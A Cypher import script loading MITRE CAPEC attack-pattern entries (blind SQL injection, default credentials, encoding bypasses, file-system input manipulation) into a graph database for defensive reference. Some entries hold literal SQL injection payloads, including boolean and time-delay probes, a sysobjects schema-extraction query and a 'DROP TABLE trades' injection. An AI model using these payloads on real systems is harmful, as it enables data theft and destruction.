CREATE (:Description{id: 576, summary: "OrderedDict([('Text', ['Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the attacker constructs input strings that probe the target through simple Boolean SQL expressions. The attacker can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the attacker determines how and where the target is vulnerable to SQL Injection.', 'For example, an attacker may try entering something like \"username\\' AND 1=1; --\" in an input field. If the result is the same as when the attacker entered \"username\" in the field, then the attacker knows that the application is vulnerable to SQL Injection. The attacker can then ask yes/no questions from the database server to extract information from it. For example, the attacker can extract table names from a database using the following types of queries:', \"If the above query executes properly, then the attacker knows that the first character in a table name in the database is a letter between m and z. If it doesn't, then the attacker knows that the character must be between a and l (assuming of course that table names only contain alphabetic characters). By performing a binary search on all character positions, the attacker can determine all table names in the database. Subsequently, the attacker may execute an actual attack and send something like:\"]), ('Block', [OrderedDict([('Code', '\"username\\' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype=\\'U\\'), 1, 1))) > 108\".')]), OrderedDict([('Code', '\"username\\'; DROP TABLE trades; --')])])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Hypothesize SQL queries in application", description: "<div level=\"0\">\n  <p class=\"text\">Generated hypotheses regarding the SQL queries in an application. For example, the attacker may hypothesize that his input is passed directly into a query that looks like:</p>\n  <p class=\"text\">Of course, there are many other possibilities.</p>\n  <div level=\"1\">\n    <p class=\"code\">\"SELECT * FROM orders WHERE ordernum = _____\"</p>\n    <p class=\"code\">or</p>\n    <p class=\"code\">\"SELECT * FROM orders WHERE ordernum IN (_____)\"</p>\n    <p class=\"code\">or</p>\n    <p class=\"code\">\"SELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____\"</p>\n  </div>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Research types of SQL queries and determine which ones could be used at various places in an application.</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Determine how to inject information into the queries", description: "<div level=\"0\">\n  <p class=\"text\">Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries:</p>\n  <div level=\"1\">\n    <p class=\"code\">\"5' OR 1=1; --\"</p>\n    <p class=\"code\">and</p>\n    <p class=\"code\">\"5) OR 1=1; --\"</p>\n    <p class=\"code\">and</p>\n    <p class=\"code\">\"ordernum DESC; --\"</p>\n  </div>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Add clauses to the SQL queries such that the query logic does not change.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one way to complete a hypothesized SQL query that would violate the application developer's assumptions."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine user-controllable input susceptible to injection", description: "<div level=\"0\">\n  <p class=\"text\">Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the attacker knows that the SQL injection was successful.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use web browser to inject input through text fields or through HTTP GET parameters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use network-level packet injection tools such as netcat to inject input</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use modified client (modified by reverse engineering) to inject input.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Response takes expected amount of time after delay is injected.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one user-controllable input susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No user-controllable input susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Determine database type", description: "<div level=\"0\">\n  <p class=\"text\">Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Inject other database-specific commands into input fields susceptible to SQL Injection. The attacker can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the attacker received a normal response from the server or not).</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Database platform in use discovered."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Database platform in use not discovered."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Extract information about database schema", description: "<div level=\"0\">\n  <p class=\"text\">Extract information about database schema by getting the database to answer yes/no questions about the schema.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Automatically extract database schema using a tool such as Absinthe.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manually perform the blind SQL Injection to extract desired information about the database schema.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Desired information about database schema extracted."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Desired information about database schema could not be extracted."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Exploit SQL Injection vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker achieves goal of unauthorized system access, denial of service, etc."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker cannot exploit the information gathered by blind SQL Injection"});
MERGE (:Reference{id: "REF-3", local_id: "R.7.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.7.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-390 - Improper Error Handling", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/390.html"});
MERGE (:CWE{id: 89});
MERGE (:CWE{id: 209});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 390});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 707});
CREATE (:ResourcesRequired{id: 263, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 70, name: "Try Common(default) Usernames and Passwords", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 505, text: "<div level=\"0\">\n  <p class=\"text\">The system uses one factor password based authentication.</p>\n</div>"});
CREATE (:Submission{id: 583});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 577, summary: "OrderedDict([('Text', ['An attacker may try certain common (default) usernames and passwords to gain access into the system and perform unauthorized actions. An attacker may try an intelligent brute force using known vendor default credentials as well as a dictionary of common usernames and passwords.', 'Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. \"secret\" or \"password\") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.'])])"});
MERGE (:CWE{id: 521});
MERGE (:CWE{id: 262});
MERGE (:CWE{id: 263});
MERGE (:CWE{id: 798});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 264, text: "<div level=\"0\">\n  <p class=\"text\">Technology or vendor specific list of default usernames and passwords.</p>\n</div>"});
CREATE (:AttackPattern{id: 71, name: "Using Unicode Encoding to Bypass Validation Logic", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 506, text: "<div level=\"0\">\n  <p class=\"text\">Filtering is performed on data that has not be properly canonicalized.</p>\n</div>"});
CREATE (:Submission{id: 584});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 356});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 578, summary: "OrderedDict([('Text', 'An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application for user-controllable inputs", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe entry points to locate vulnerabilities", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try to use Unicode encoding of content in Scripts in order to bypass validation routines.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Try to use Unicode encoding of content in HTML in order to bypass validation routines.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Try to use Unicode encoding of content in CSS in order to bypass validation routines.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application accepts user-controllable input.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's Unicode encoded payload is processed and acted on by the application without filtering or transcoding"});
CREATE (:Outcome{id: 2, type: "Failure", description: "The application decodes the charset and filters the inputs."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.71.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.71.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:CWE{id: 176});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 179});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 183});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 692});
CREATE (:AttackPattern{id: 72, name: "URL Encoding", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 507, text: "<div level=\"0\">\n  <p class=\"text\">The application should accepts and decodes URL input.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 508, text: "<div level=\"0\">\n  <p class=\"text\">The application performs insufficient filtering/canonicalization on the URLs.</p>\n</div>"});
CREATE (:Submission{id: 585});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 357});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 579, summary: "OrderedDict([('Text', 'This attack targets the encoding of the URL. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The attacker could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an attacker may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker accesses the server using a specific URL.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to encode some special characters in the URL. The attacker finds out that some characters are not filtered properly.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts a malicious URL string request and sends it to the server.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters may have harmful consequences.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.72.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.72.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-35", local_id: "R.72.3", author: "Gunter Ollmann", title: "URL Encoded Attacks - Attacks using the common web browser", publisher: "CGISecurity.com", link: "http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html"});
MERGE (:Reference{id: "REF-36", local_id: "R.72.4", author: "['T. Berners-Lee', 'R. Fielding', 'L. Masinter']", title: "RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax", pubdate: "January 2005", link: "http://www.ietf.org/rfc/rfc3986.txt"});
MERGE (:Reference{id: "REF-37", local_id: "R.72.5", author: "['T. Berners-Lee', 'L. Masinter', 'M. McCahill']", title: "RFC 1738 - Uniform Resource Locators (URL)", pubdate: "December 1994", link: "http://www.ietf.org/rfc/rfc1738.txt"});
MERGE (:Reference{id: "REF-38", local_id: "R.72.6", title: "HTML URL Encoding Reference", publisher: "Refsnes Data", link: "http://www.w3schools.com/tags/ref_urlencode.asp"});
MERGE (:Reference{id: "REF-39", local_id: "R.72.7", title: "The URLEncode and URLDecode Page", publisher: "Albion Research Ltd", link: "http://www.albionresearch.com/misc/urlencode.php"});
MERGE (:Reference{id: "REF-18", local_id: "R.72.8", author: "David Wheeler", title: "Secure Programming for Linux and Unix HOWTO", section: "5.11.4. Validating Hypertext Links (URIs/URLs)", link: "http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS"});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 177});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 21});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
CREATE (:AttackPattern{id: 73, name: "User-Controlled Filename", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 509, text: "<div level=\"0\">\n  <p class=\"text\">The victim must trust the name and locale of user controlled filenames.</p>\n</div>"});
CREATE (:Submission{id: 586});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 358});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:Description{id: 580, summary: "OrderedDict([('Text', 'An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.73.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 96});
MERGE (:CWE{id: 348});
MERGE (:CWE{id: 116});
MERGE (:CWE{id: 350});
MERGE (:CWE{id: 86});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 74, name: "Manipulating User State", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 510, text: "<div level=\"0\">\n  <p class=\"text\">User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.</p>\n</div>"});
CREATE (:Submission{id: 587});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 359});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:Modification{id: 360});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required, Solutions_and_Mitigations"});
CREATE (:Description{id: 581, summary: "OrderedDict([('Text', 'The adversary modifies state information maintained by the target software in user-accessible locations. If successful, the target software will use this tainted state information and execute in an unintended manner. State management is an important function within an application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Adversary determines the nature of state management employed by the application. This includes determining the location (client-side, server-side or both) and possibly the items stored as part of user state.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The adversary now tries to modify the user state contents (possibly blindly if the contents are encrypted or otherwise obfuscated) and observe the effects of this change on the application.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Having determined the information stored in the user state and the possible ways to modify it, the adversary can violate it in order to perform illegitimate actions.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2005-4448", description: "<div level=\"0\">\n  <p class=\"text\">FlatNuke 2.5.6 verifies authentication credentials based on an MD5 checksum of the admin name and the hashed password rather than the plaintext password, which allows attackers to gain privileges by obtaining the password hash (possibly via CVE-2005-2813), then calculating the credentials and including them in the secid cookie.</p>\n</div>"});
MERGE (:CWE{id: 372});
MERGE (:CWE{id: 371});
MERGE (:CWE{id: 315});
MERGE (:CWE{id: 353});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 268, text: "<div level=\"0\">\n  <p class=\"text\">The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).</p>\n</div>"});
CREATE (:AttackPattern{id: 75, name: "Manipulating Writeable Configuration Files", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 511, text: "<div level=\"0\">\n  <p class=\"text\">Configuration files must be modifiable by the attacker</p>\n</div>"});
CREATE (:Submission{id: 588});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 361});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 582, summary: "OrderedDict([('Text', \"Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.\")])"});
MERGE (:Reference{id: "REF-2", local_id: "R.75.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 349});
MERGE (:CWE{id: 99});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 353});
MERGE (:CWE{id: 354});
MERGE (:CWE{id: 713});
CREATE (:AttackPattern{id: 76, name: "Manipulating Web Input to File System Calls", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 512, text: "<div level=\"0\">\n  <p class=\"text\">Program must allow for user controlled variables to be applied directly to the filesystem</p>\n</div>"});
CREATE (:Submission{id: 589});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 362});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Examples-Instances, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 100, name: "Manipulating Input to File System Calls"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 583, summary: "OrderedDict([('Text', 'An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Fingerprinting of the operating system", description: "<div level=\"0\">\n  <p class=\"text\">In order to create a valid file injection, the attacker needs to know what the underlying OS is.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Induce errors to find informative error messages</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The target software accepts connections via the network.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Operating environment (operating system, language, and/or middleware) is correctly identified."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Multiple candidate operating environments are suggested."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Survey the Application to Identify User-controllable Inputs", description: "<div level=\"0\">\n  <p class=\"text\">The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated user</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider web sites for all available links, entry points to the web site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manually explore application and inventory all application inputs</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker develops a list of likely interesting path (application or OS related)"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Vary inputs, looking for malicious results", description: "<div level=\"0\">\n  <p class=\"text\">Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.)</p>\n</div>"});
